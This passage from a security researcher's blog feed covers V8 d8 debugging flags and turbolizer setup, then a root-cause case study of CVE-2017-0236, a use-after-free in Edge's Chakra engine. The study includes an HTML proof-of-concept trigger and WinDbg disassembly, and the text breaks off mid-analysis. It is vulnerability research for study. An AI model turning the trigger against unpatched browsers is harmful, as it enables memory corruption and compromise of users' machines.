testing)</span><br><span class="line">  --max_stack_trace_source_length (maximum length of function source code printed in a stack trace.)</span><br><span class="line">  --trace_object_groups (print object groups detected during each garbage collection)</span><br><span class="line">  --use_idle_notification (Use idle notification to reduce memory footprint.)</span><br><span class="line">  --use_verbose_printer (allows verbose printing)</span><br><span class="line">  --log_regs_modified (When logging register values, only print modified registers.)</span><br><span class="line">  --stack_trace_on_illegal (print stack trace when an illegal exception is thrown)</span><br><span class="line">  --print_all_exceptions (print exception object and stack trace on each thrown exception)</span><br><span class="line">  --print_ast (print source AST)</span><br><span class="line">  --print_builtin_ast (print source AST for builtins)</span><br><span class="line">  --print_builtin_scopes (print scopes for builtins)</span><br><span class="line">  --print_scopes (print scopes)</span><br><span class="line">  --gc_verbose (print stuff during garbage collection)</span><br><span class="line">  --print_handles (report handles after GC)</span><br><span class="line">  --print_global_handles (report global handles after GC)</span><br><span class="line">  --print_turbo_replay (print C++ code to recreate TurboFan graphs)</span><br><span class="line">  --trace_normalization (prints when objects are turned into dictionaries.)</span><br><span class="line">  --print_break_location (print source location on debug break)</span><br><span class="line">  --print_opt_source (print source code of optimized and inlined functions)</span><br><span class="line">  --print_code_stubs (print code stubs)</span><br><span class="line">  --print_code (print generated code)</span><br><span class="line">  --print_opt_code (print optimized code)</span><br><span class="line">  --print_opt_code_filter (filter for printing optimized code)</span><br><span class="line">  --print_unopt_code (print unoptimized code before printing optimized code based on it)</span><br><span class="line">  --print_code_verbose (print more information for code)</span><br><span class="line">  --print_builtin_code (print generated code for builtins)</span><br><span class="line">  --sodium (print generated code output suitable for use with the Sodium code viewer)</span><br><span class="line">  --print_all_code (enable all flags related to printing code)</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --help | grep trace</span><br><span class="line">  --trace-pretenuring (trace pretenuring decisions of HAllocate instructions)</span><br><span class="line">  --trace-pretenuring-statistics (trace allocation site pretenuring statistics)</span><br><span class="line">  --trace-block-coverage (trace collected block coverage information)</span><br><span class="line">  --trace-ignition-codegen (trace the codegen of ignition interpreter bytecode handlers)</span><br><span class="line">  --trace-ignition-dispatches (traces the dispatches to bytecode handlers by the ignition interpreter)</span><br><span class="line">  --trace-ignition-dispatches-output-file (the file to which the bytecode handler dispatch table is written (by default, the table is not written to a file))</span><br><span class="line">  --trace-track-allocation-sites (trace the tracking of allocation sites)</span><br><span class="line">  --trace-migration (trace object migration)</span><br><span class="line">  --trace-generalization (trace map generalization)</span><br><span class="line">  --trace-concurrent-recompilation (track concurrent recompilation)</span><br><span class="line">  --trace-turbo (trace generated TurboFan IR)</span><br><span class="line">  --trace-turbo-path (directory to dump generated TurboFan IR to)</span><br><span class="line">  --trace-turbo-filter (filter for tracing turbofan compilation)</span><br><span class="line">  --trace-turbo-graph (trace generated TurboFan graphs)</span><br><span class="line">  --trace-turbo-scheduled (trace TurboFan IR with schedule)</span><br><span class="line">  --trace-turbo-cfg-file (trace turbo cfg graph (for C1 visualizer) to a given file name)</span><br><span class="line">  --trace-turbo-types (trace TurboFan&#39;s types)</span><br><span class="line">  --trace-turbo-scheduler (trace TurboFan&#39;s scheduler)</span><br><span class="line">  --trace-turbo-reduction (trace TurboFan&#39;s various reducers)</span><br><span class="line">  --trace-turbo-trimming (trace TurboFan&#39;s graph trimmer)</span><br><span class="line">  --trace-turbo-jt (trace TurboFan&#39;s jump threading)</span><br><span class="line">  --trace-turbo-ceq (trace TurboFan&#39;s control equivalence)</span><br><span class="line">  --trace-turbo-loop (trace TurboFan&#39;s loop optimizations)</span><br><span class="line">  --trace-alloc (trace register allocator)</span><br><span class="line">  --trace-all-uses (trace all use positions)</span><br><span class="line">  --trace-representation (trace representation types)</span><br><span class="line">  --trace-verify-csa (trace code stubs verification)</span><br><span class="line">  --trace-turbo-inlining (trace TurboFan inlining)</span><br><span class="line">  --trace-osr (trace on-stack replacement)</span><br><span class="line">  --trace-environment-liveness (trace liveness of local variable slots)</span><br><span class="line">  --trace-turbo-load-elimination (trace TurboFan load elimination)</span><br><span class="line">  --trace-store-elimination (trace store elimination)</span><br><span class="line">  --wasm-trace-native-heap (trace wasm native heap events)</span><br><span class="line">  --wasm-trace-serialization (trace serialization&#x2F;deserialization)</span><br><span class="line">  --trace-wasm-decoder (trace decoding of wasm code)</span><br><span class="line">  --trace-wasm-decode-time (trace decoding time of wasm code)</span><br><span class="line">  --trace-wasm-compiler (trace compiling of wasm code)</span><br><span class="line">  --trace-wasm-interpreter (trace interpretation of wasm code)</span><br><span class="line">  --trace-wasm-streaming (trace streaming compilation of wasm code)</span><br><span class="line">  --trace-wasm-ast-start (start function for wasm AST trace (inclusive))</span><br><span class="line">  --trace-wasm-ast-end (end function for wasm AST trace (exclusive))</span><br><span class="line">  --trace-liftoff (trace Liftoff, the baseline compiler for WebAssembly)</span><br><span class="line">  --wasm-trace-memory (print all memory updates performed in wasm code)</span><br><span class="line">  --trace-asm-time (log asm.js timing info to the console)</span><br><span class="line">  --trace-asm-scanner (log tokens encountered by asm.js scanner)</span><br><span class="line">  --trace-asm-parser (verbose logging of asm.js parse failures)</span><br><span class="line">  --trace-wasm-lazy-compilation (trace lazy compilation of wasm functions)</span><br><span class="line">  --trace-gc (print one trace line following each garbage collection)</span><br><span class="line">  --trace-gc-nvp (print one detailed trace line in name&#x3D;value format after each garbage collection)</span><br><span class="line">  --trace-gc-ignore-scavenger (do not print trace line after scavenger collection)</span><br><span class="line">  --trace-idle-notification (print one trace line following each idle notification)</span><br><span class="line">  --trace-idle-notification-verbose (prints the heap state used by the idle notification)</span><br><span class="line">  --trace-gc-verbose (print more details following each garbage collection)</span><br><span class="line">  --trace-allocation-stack-interval (print stack trace after &lt;n&gt; free-list allocations)</span><br><span class="line">  --trace-duplicate-threshold-kb (print duplicate objects in the heap if their size is more than given threshold)</span><br><span class="line">  --trace-fragmentation (report fragmentation for old space)</span><br><span class="line">  --trace-fragmentation-verbose (report fragmentation for old space (detailed))</span><br><span class="line">  --trace-evacuation (report evacuation statistics)</span><br><span class="line">  --trace-mutator-utilization (print mutator utilization, allocation speed, gc speed)</span><br><span class="line">  --trace-unmapper (Trace the unmapping)</span><br><span class="line">  --trace-parallel-scavenge (trace parallel scavenge)</span><br><span class="line">  --trace-concurrent-marking (trace concurrent marking)</span><br><span class="line">  --trace-incremental-marking (trace progress of the incremental marking)</span><br><span class="line">  --trace-stress-marking (trace stress marking progress)</span><br><span class="line">  --trace-stress-scavenge (trace stress scavenge progress)</span><br><span class="line">  --trace-gc-object-stats (trace object counts and memory usage)</span><br><span class="line">  --trace-zone-stats (trace zone memory usage)</span><br><span class="line">  --trace-detached-contexts (trace native contexts that are expected to be garbage collected)</span><br><span class="line">  --stack-trace-limit (number of stack frames to capture)</span><br><span class="line">  --builtins-in-stack-traces (show built-in functions in stack traces)</span><br><span class="line">  --trace (trace function calls)</span><br><span class="line">  --trace-opt (trace lazy optimization)</span><br><span class="line">  --trace-opt-verbose (extra verbose compilation tracing)</span><br><span class="line">  --trace-opt-stats (trace lazy optimization statistics)</span><br><span class="line">  --trace-deopt (trace optimize function deoptimization)</span><br><span class="line">  --trace-file-names (include file names in trace-opt&#x2F;trace-deopt output)</span><br><span class="line">  --trace-interrupts (trace interrupts when they are handled)</span><br><span class="line">  --trace-serializer (print code serializer trace)</span><br><span class="line">  --trace-compiler-dispatcher (trace compiler dispatcher activity)</span><br><span class="line">  --trace-compiler-dispatcher-jobs (trace progress of individual jobs managed by the compiler dispatcher)</span><br><span class="line">  --trace-js-array-abuse (trace out-of-bounds accesses to JS arrays)</span><br><span class="line">  --trace-external-array-abuse (trace out-of-bounds-accesses to external arrays)</span><br><span class="line">  --trace-array-abuse (trace out-of-bounds accesses to all arrays)</span><br><span class="line">  --trace-side-effect-free-debug-evaluate (print debug messages for side-effect-free debug-evaluate for testing)</span><br><span class="line">  --max-stack-trace-source-length (maximum length of function source code printed in a stack trace.)</span><br><span class="line">  --heap-profiler-trace-objects (Dump heap object allocations&#x2F;movements&#x2F;size_updates)</span><br><span class="line">  --trace-ic (trace inline cache state transitions for tools&#x2F;ic-processor)</span><br><span class="line">  --trace-prototype-users (Trace updates to prototype user tracking)</span><br><span class="line">  --trace-for-in-enumerate (Trace for-in enumerate slow-paths)</span><br><span class="line">  --trace-maps (trace map creation)</span><br><span class="line">  --trace-maps-details (also log map details)</span><br><span class="line">  --trace-sim (Trace simulator execution)</span><br><span class="line">  --trace-sim-messages (Trace simulator debug messages. Implied by --trace-sim.)</span><br><span class="line">  --stack-trace-on-illegal (print stack trace when an illegal exception is thrown)</span><br><span class="line">  --trace-rail (trace RAIL mode)</span><br><span class="line">  --print-all-exceptions (print exception object and stack trace on each thrown exception)</span><br><span class="line">  --trace-lazy-deserialization (Trace lazy deserialization.)</span><br><span class="line">  --trace-minor-mc-parallel-marking (trace parallel marking for the young generation)</span><br><span class="line">  --trace-contexts (trace contexts operations)</span><br><span class="line">  --trace-turbo-escape (enable tracing in escape analysis)</span><br><span class="line">  --trace-module-status (Trace status transitions of ECMAScript modules)</span><br><span class="line">  --trace-normalization (prints when objects are turned into dictionaries.)</span><br><span class="line">  --trace-lazy (trace lazy compilation)</span><br><span class="line">  --trace-isolates (trace isolate state changes)</span><br><span class="line">  --trace-regexp-bytecodes (trace regexp bytecode execution)</span><br><span class="line">  --trace-regexp-assembler (trace regexp macro assembler calls.)</span><br><span class="line">  --trace-regexp-parser (trace regexp parsing)</span><br><span class="line">  --trace-wasm-instances (trace creation and collection of wasm instances)</span><br><span class="line">  --redirect-code-traces (output deopt information and disassembly into file code-&lt;pid&gt;-&lt;isolate id&gt;.asm)</span><br><span class="line">  --redirect-code-traces-to (output deopt information and disassembly into the given file)</span><br><span class="line">  --trace-elements-transitions (trace elements transitions)</span><br><span class="line">  --trace-creation-allocation-sites (trace the creation of allocation sites)</span><br></pre></td></tr></table></figure><h3 id="IR可视化工具-turbolizer"><a href="#IR可视化工具-turbolizer" class="headerlink" title="IR可视化工具:turbolizer"></a>IR可视化工具:turbolizer</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;v8&#x2F;tools&#x2F;turbolizer$ npm i</span><br><span class="line">up to date in 2.01s</span><br><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;v8&#x2F;tools&#x2F;turbolizer$ npm run-script build</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162521.png" alt=""></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>生成的在build目录下，如图<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162603.png" alt=""><br>然后在turbolizer目录下启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>打开Chrome浏览器，注意一件事情，那就是这东西十分不好用……他对浏览器兼容适配很不好，Chrome勉强能用，提示无效的json文件就刷新几下看看……<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162824.png" alt=""><br>选择输入文件。<br>这里的输入文件是来源于–trace-turbo这个flag生成的json文件。<br>我举个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>) </span>&#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">add(<span class="number">23</span>, <span class="number">44</span>);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">88</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(add);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163131.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;d8 --allow-natives-syntax --trace-turbo test.js --trace-turbo-path &#x2F;Users&#x2F;sakura&#x2F;Desktop&#x2F;tur</span><br></pre></td></tr></table></figure><p>–allow-natives-syntax是用来开启%OptimizeFunctionOnNextCall(add)标志的<br>–trace-turbo是trace TurboFan优化阶段，生成json文件<br>–trace-turbo-path 指定输出json的目录</p><p>然后上传上去就可以选择阶段和可视化的看IR了~<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163439.png" alt=""><br>因为这个工具的一些兼容关系，你可能需要自己改一下html，比如我就是height太小（原本25px，逗我……）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163642.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;v8-hidden-class-test&quot;&gt;&lt;a href=&quot;#v8-hidden-class-test&quot; class=&quot;headerlink&quot; title=&quot;v8 hidden class test&quot;&gt;&lt;/a&gt;v8 hidden class test&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>case study:cve-2017-0236</title>
    <link href="http://eternalsakura13.com/2018/07/25/cve-2017-0236/"/>
    <id>http://eternalsakura13.com/2018/07/25/cve-2017-0236/</id>
    <published>2018-07-24T17:41:59.440Z</published>
    <updated>2018-10-22T14:25:51.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><a href="ed2k://|file|cn_windows_10_multiple_editions_version_1607_updated_jan_2017_x64_dvd_9714394.iso|4747692032|27841B07666580185078EE62915191A1|/">Windows 10 (Multiple Editions), Version 1607</a></li><li><a href="https://developer.microsoft.com/en-US/windows/downloads/windows-10-sdk" target="_blank" rel="noopener">Debugging Tools for Windows 10 (WinDbg)</a></li><li><a href="https://github.com/SkyLined/EdgeDbg" target="_blank" rel="noopener">EdgeDbg</a></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>PoC如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Math</span>.cosh.call([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])<span class="comment">//--&gt;和vul无关，只是测试用</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'uaf1.js'</span>);</span></span><br><span class="line">worker.postMessage(buffer,[buffer]);</span><br><span class="line">worker.terminate();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">test case</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用EdgeDbg启动edge，并直接指定URL，效果如下（当然在这里我们直接指定的是test.html的本地存放路径）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">H:\dev\C\EdgeDbg&gt;EdgeDbg_x86.exe http:&#x2F;&#x2F;example.com</span><br><span class="line">* Terminating any running instances of Microsoft Edge...</span><br><span class="line">* Activating Microsoft Edge and opening http:&#x2F;&#x2F;example.com...</span><br><span class="line">+ MicrosoftEdge.exe process id &#x3D; 2744</span><br><span class="line">* Waiting for MicrosoftEdgeCP.exe process to start...</span><br><span class="line">+ MicrosoftEdgeCP.exe process id &#x3D; 2748</span><br><span class="line">+ RuntimeBroker.exe process id &#x3D; 2936</span><br><span class="line">+ browser_broker.exe process id &#x3D; 3088</span><br><span class="line">+ ApplicationFrameHost.exe process id &#x3D; 1234</span><br><span class="line"></span><br><span class="line">H:\dev\C\EdgeDbg&gt;</span><br></pre></td></tr></table></figure><p>然后在windbg里attach上MicrosoftEdgeCP.exe的pid即可。<br>在windbg里输入，设置符号服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http:&#x2F;&#x2F;msdl.microsoft.com&#x2F;download&#x2F;symbols</span><br></pre></td></tr></table></figure><p>然后下断，输入g继续运行，观察是否断下，若顺利断下，则代表环境测试通过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bu chakra!Js::Math::Cosh</span><br><span class="line">bu chakra!Js::ArrayBuffer::ClearParentsLength</span><br></pre></td></tr></table></figure><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// Math.cosh.call([1,2,3]) </span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>); <span class="comment">//[0]</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer); <span class="comment">//[1]</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'uaf1.js'</span>);</span></span><br><span class="line"><span class="actionscript">worker.postMessage(buffer,[buffer]); <span class="comment">//[2]</span></span></span><br><span class="line"><span class="actionscript">worker.terminate(); <span class="comment">//[2]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">test case</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>UAF(Use After Free)：即释放后使用。<br>内存释放后未将pointer置为NULL，变成Dangling pointer；将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控。</p><h3 id="0"><a href="#0" class="headerlink" title="[0]"></a>[0]</h3><p><strong>创建JSArrayBuffer Object，并通过VirtualAlloc分配内存空间buffer，JSArrayBuffer Object存有指向其申请的缓冲区的引用</strong></p><p>uf chakra!Js::ArrayBuffer::NewInstance </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::ArrayBuffer::NewInstance </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffa&#96;d2cb2633 e828000000 call chakra!Js::ArrayBuffer::GetByteLengthFromVar (00007ffa&#96;d2cb2660)</span><br><span class="line">chakra!Js::ArrayBuffer::NewInstance+0xc8:</span><br><span class="line">00007ffa&#96;d2cb2638 488b17 mov rdx,qword ptr [rdi]</span><br><span class="line">00007ffa&#96;d2cb263b 8bc8 mov ecx,eax</span><br><span class="line">00007ffa&#96;d2cb263d 488b9298040000 mov rdx,qword ptr [rdx+498h]</span><br><span class="line">00007ffa&#96;d2cb2644 e8733dfdff call chakra!Js::JavascriptArrayBuffer::Create (00007ffa&#96;d2c863bc)&#x2F;&#x2F;------&gt;Create Buffer</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>uf chakra!Js::JavascriptArrayBuffer::Create</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::JavascriptArrayBuffer::Create</span><br><span class="line">chakra!Js::JavascriptArrayBuffer::Create:</span><br><span class="line">...</span><br><span class="line">00007ffa&#96;d2c863fb e888010000 call chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer (00007ffa&#96;d2c86588)</span><br><span class="line">...</span><br><span class="line">00007ffa&#96;d2c8642a c3 ret</span><br></pre></td></tr></table></figure><p>uf chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer</span><br><span class="line">chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer:</span><br><span class="line">...</span><br><span class="line">00007ffa&#96;d2c8659e e89dffffff call chakra!Js::JavascriptArrayBuffer::IsValidVirtualBufferLength (00007ffa&#96;d2c86540)&#x2F;&#x2F;-----&gt;根据这个结果决定使用AllocWrapper还是malloc，length&gt;&#x3D;0x10000则使用AllocWrapper</span><br><span class="line">00007ffa&#96;d2c865a3 4c8b0ddec35600 mov r9,qword ptr [chakra!_imp_malloc (00007ffa&#96;d31f2988)]</span><br><span class="line">00007ffa&#96;d2c865aa 488d0d4f920200 lea rcx,[chakra!Js::JavascriptArrayBuffer::AllocWrapper (00007ffa&#96;d2caf800)]</span><br><span class="line">00007ffa&#96;d2c865b1 4c8b442440 mov r8,qword ptr [rsp+40h]</span><br><span class="line">00007ffa&#96;d2c865b6 84c0 test al,al</span><br><span class="line">00007ffa&#96;d2c865b8 8b542438 mov edx,dword ptr [rsp+38h]</span><br><span class="line">00007ffa&#96;d2c865bc 4c0f45c9 cmovne r9,rcx</span><br><span class="line">00007ffa&#96;d2c865c0 488bcb mov rcx,rbx</span><br><span class="line">00007ffa&#96;d2c865c3 e85c010000 call chakra!Js::ArrayBuffer::ArrayBuffer&lt;void * __ptr64 (__cdecl*)(unsigned __int64)&gt; (00007ffa&#96;d2c86724)</span><br><span class="line">00007ffa&#96;d2c865c8 488d05512b5100 lea rax,[chakra!Js::JavascriptArrayBuffer::&#96;vftable&#39; (00007ffa&#96;d3199120)]</span><br><span class="line">00007ffa&#96;d2c865cf 488903 mov qword ptr [rbx],rax</span><br><span class="line">00007ffa&#96;d2c865d2 488bc3 mov rax,rbx</span><br><span class="line">00007ffa&#96;d2c865d5 4883c420 add rsp,20h</span><br><span class="line">00007ffa&#96;d2c865d9 5b pop rbx</span><br><span class="line">00007ffa&#96;d2c865da c3 ret</span><br></pre></td></tr></table></figure><p>uf Js::JavascriptArrayBuffer::AllocWrapper是VirtualAlloc的封装 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf Js::JavascriptArrayBuffer::AllocWrapper </span><br><span class="line">chakra!Js::JavascriptArrayBuffer::AllocWrapper:</span><br><span class="line">00007ffa&#96;d2caf800 48894c2408 mov qword ptr [rsp+8],rcx</span><br><span class="line">00007ffa&#96;d2caf805 53 push rbx</span><br><span class="line">00007ffa&#96;d2caf806 4883ec20 sub rsp,20h</span><br><span class="line">00007ffa&#96;d2caf80a 33c9 xor ecx,ecx</span><br><span class="line">00007ffa&#96;d2caf80c 48ba0000000001000000 mov rdx,100000000h</span><br><span class="line">00007ffa&#96;d2caf816 41b800200000 mov r8d,2000h</span><br><span class="line">00007ffa&#96;d2caf81c 448d4901 lea r9d,[rcx+1]</span><br><span class="line">00007ffa&#96;d2caf820 ff15522c5400 call qword ptr [chakra!_imp_VirtualAlloc (00007ffa&#96;d31f2478)]</span><br><span class="line">00007ffa&#96;d2caf826 488bd8 mov rbx,rax</span><br><span class="line">00007ffa&#96;d2caf829 4885c0 test rax,rax</span><br><span class="line">00007ffa&#96;d2caf82c 7429 je chakra!Js::JavascriptArrayBuffer::AllocWrapper+0x57 (00007ffa&#96;d2caf857) Branch</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120347.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120421.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dqs 000001d9&#96;15dc7e80 l1</span><br><span class="line">000001d9&#96;15dc7e80 00007ffa&#96;d3199120 chakra!Js::JavascriptArrayBuffer::&#96;vftable&#39;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0:010&gt; dq 000001d9&#96;15dc7e80----&gt;JSArrayBuffer Object，存有指向buffer的pointer</span><br><span class="line">000001d9&#96;15dc7e80 00007ffa&#96;d3199120 000001d9&#96;15ebae80</span><br><span class="line">000001d9&#96;15dc7e90 00000000&#96;00000000 00000000&#96;00000000</span><br><span class="line">000001d9&#96;15dc7ea0 00000000&#96;00000000 00000000&#96;00000000</span><br><span class="line">000001d9&#96;15dc7eb0 000001da&#96;15ff0000------&gt;buffer 00000000&#96;00010000</span><br></pre></td></tr></table></figure><h3 id="1"><a href="#1" class="headerlink" title="[1]"></a>[1]</h3><p>创建JSTypedArray Object，存有指向JSArrayBuffer的引用和<strong>JSArrayBuffer Object申请的缓冲区的引用</strong></p><p>bu chakra!Js::TypedArrayBase::CreateNewInstance</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; ub $ip</span><br><span class="line">chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::NewInstance+0x96:</span><br><span class="line">00007ffa&#96;d2c50d66 0f8497912700 je chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400b3 (00007ffa&#96;d2ec9f03)</span><br><span class="line">00007ffa&#96;d2c50d6c 4885db test rbx,rbx</span><br><span class="line">00007ffa&#96;d2c50d6f 0f857e912700 jne chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400a3 (00007ffa&#96;d2ec9ef3)</span><br><span class="line">00007ffa&#96;d2c50d75 4c8d0d34000000 lea r9,[chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::Create (00007ffa&#96;d2c50db0)]</span><br><span class="line">00007ffa&#96;d2c50d7c 41b804000000 mov r8d,4</span><br><span class="line">00007ffa&#96;d2c50d82 488bd6 mov rdx,rsi</span><br><span class="line">00007ffa&#96;d2c50d85 488d4c2420 lea rcx,[rsp+20h]</span><br><span class="line">00007ffa&#96;d2c50d8a e805080000 call chakra!Js::TypedArrayBase::CreateNewInstance (00007ffa&#96;d2c51594)</span><br><span class="line">0:010&gt; u $ip</span><br><span 